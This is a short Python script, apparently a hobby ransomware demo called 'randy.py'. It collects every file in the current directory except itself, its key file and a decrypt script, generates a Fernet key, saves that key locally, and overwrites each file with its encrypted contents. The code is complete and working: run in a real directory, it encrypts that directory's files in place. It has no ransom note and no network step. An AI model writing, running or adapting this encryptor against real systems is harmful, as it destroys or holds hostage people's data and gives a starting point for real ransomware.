# important import stuff, spooky I know
import os

from cryptography.fernet import Fernet

    
# Lets find the files first!

files = []

# Goes through all files in the directory and adds them to the list

for file in os.listdir():
    if file == "randy.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
        
# Prints the files found and the list of files   
        
print("Files found: " + str(len(files)))
print(files)

# Generates a key and saves it to thekey.key

print("Generating key...")
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypts the files

print("Encrypting files...")
for file in files:
    with open(file, "rb") as thefile:
        data = thefile.read()
        
    f = Fernet(key)
    encrypted = f.encrypt(data)
    
    with open(file, "wb") as thefile:
        thefile.write(encrypted)
    
    
